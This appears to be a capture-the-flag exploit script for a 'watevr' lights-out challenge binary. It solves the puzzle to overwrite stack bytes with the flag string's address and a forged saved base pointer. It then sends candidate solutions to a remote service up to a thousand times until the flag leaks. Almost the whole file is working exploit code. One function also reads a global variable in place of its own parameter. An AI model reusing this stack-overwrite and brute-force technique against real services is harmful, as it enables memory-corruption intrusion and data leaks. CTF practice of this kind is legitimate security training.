import math
import time
import struct
import subprocess
import socket
import random

import os

flag = input("flag? ")
ip, port = input("service? ").split(":")
port = int(port)

ex = "a.out"

ex_path = os.path.join(os.getcwd(), ex)

class BoardPrecompute:
    def __init__(self, width, height):
        self.width = width
        self.height = height

        # Create self.single_flips
        self.single_flips = {}
        for combination in range(2 ** width):
            board = Board(width, height)
            for x in range(width):
                if (combination >> x) & 1 == 1:
                    board.flip(x, 0)

            board.sift_down()
            last_row = board.row_as_int(height - 1)

            # Is last_row a single flip?
            if last_row != 0 and last_row & (last_row - 1) == 0:
                pow2 = int(math.log2(last_row))
                print(bin(combination), "->", pow2)
                self.single_flips[pow2] = combination

        if len(self.single_flips) != width:
            print("Invalid board size, does not give enough single flips")

class Board:
    # Gives a solved board with all lights off
    def __init__(self, width, height):
        self.width = width
        self.height = height
        self.content = [False for _ in range(width * height)]

    def get(self, x, y):
        if 0 <= x < self.width and 0 <= y < self.height:
            return self.content[x + y * self.width]
        return -1

    def flip_single(self, x, y):
        if 0 <= x < self.width and 0 <= y < self.height:
            self.content[x + y * self.width] ^= True

    def flip(self, x, y):
        self.flip_single(x, y - 1)
        self.flip_single(x - 1, y)
        self.flip_single(x, y)
        self.flip_single(x + 1, y)
        self.flip_single(x, y + 1)

    def to_string(self):
        lines = []
        for y in range(self.height):
            line = ""
            for x in range(self.width - 1, -1, -1):
                line += ".#"[self.content[x + y * self.width]]
            lines.append(line)

        return "\n".join(lines)

    def row_as_int(self, y):
        result = 0
        for x in range(self.width):
            if self.get(x, y) == 1:
                result |= 1 << x
        return result

    def copy(self):
        result = Board(self.width, self.height)
        result.content = list(self.content)
        return result

    def xor(self, other):
        assert((self.width, self.height) == (other.width, other.height))

        for i in range(len(self.content)):
            self.content[i] ^= other.content[i]

    # Modifies board in place, and gives a list of positions flipped
    def sift_down(self):
        positions = []
        for y in range(1, self.height):
            for x in range(self.width):
                if self.get(x, y - 1) == 1:
                    self.flip(x, y)
                    positions.append((x, y))

        return positions

    # Solves the board, turning off all ligths
    def solve(self, bpcmp):
        assert((self.width, self.height) == (bpcmp.width, bpcmp.height))

        workcopy = self.copy()

        workcopy.sift_down()

        flip_first = 0
        for x in range(self.width):
            if workcopy.get(x, self.height - 1) == 1:
                flip_first ^= bpcmp.single_flips[x]

        flips = []
        for x in range(self.width):
            if flip_first >> x & 1 == 1:
                flips.append(x)

        positions = []
        for x in flips:
            self.flip(x, 0)
            positions.append((x, 0))
        positions.extend(self.sift_down())

        return positions


    def from_bytes(blist):
        result = Board(8, len(blist))
        for y in range(len(blist)):
            for x in range(8):
                if blist[y] >> x & 1 == 1:
                    result.flip_single(x, y)
        return result

def solve(curr_bytes, wanted_bytes, bpcmp, loud=False):
    wanted_board = Board.from_bytes(wanted_bytes)
    board = Board.from_bytes(current_bytes)

    if loud:
        print("Wanted:")
        print(wanted_board.to_string())

        print("Current:")
        print(board.to_string())

        time.sleep(1)

    solve_board = board.copy()
    solve_board.xor(wanted_board)
    solution = solve_board.solve(bpcmp)

    if loud:
        for x, y in solution:
            print("\033[2J")
            print(board.to_string())
            print(x, y)
            board.flip(x, y)
            time.sleep(0.03)

        print(board.to_string())

    return solution

ORIGIN = 0x00000000_00400000

with open("downloads/M-x-5x5", "rb") as f:
    content = f.read()
    flag_start = content.index(b"watevr")


    flag_location_in_binary = flag_start | ORIGIN
    print("Flag at address", hex(flag_location_in_binary))
flag_bytes = struct.pack("<Q", flag_location_in_binary)
flag_bytes = list(flag_bytes)

bpcmp = BoardPrecompute(8, 16)

rbp_diff = 0x20

solutions = set()

for wrbp in range(0x0, 0x100, 0x8):
    wanted_bytes = [
        *flag_bytes,
        wrbp, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]

    crbp = wrbp + rbp_diff
    crlo = crbp & 0xff
    crhi = (crbp >> 8) & 0xff

    current_bytes = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        crlo, crhi, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]

    sol = solve(current_bytes, wanted_bytes, bpcmp)

    sol_str = "\n8 "

    for x, y in sol:
        sol_str += f"f {x} {y} "
    sol_str += "q"

    solutions.add(sol_str)

print("Found", len(solutions), "solutions")

if ip == "no":
    for solution in solutions:
        print("===")
        print(solution)
    exit()

for attempt in range(1000): # Should be enough
    solution = random.choice(list(solutions))

    print("Attempt", attempt, "Testing", solution[:40], "...")

    sock = socket.socket()
    sock.connect((ip, port))

    sock.send(solution.encode("utf-8"))
    time.sleep(0.1)

    out = sock.recv(10000)

    print("Got:", "...", out[-100:])

    if b"watevr{" in out:
        rec_flag = out[out.index(b"watevr{"):].decode("utf-8").strip()
        print("Flag:", rec_flag)

        if rec_flag == flag:
            exit(0)
        else:
            exit(1)

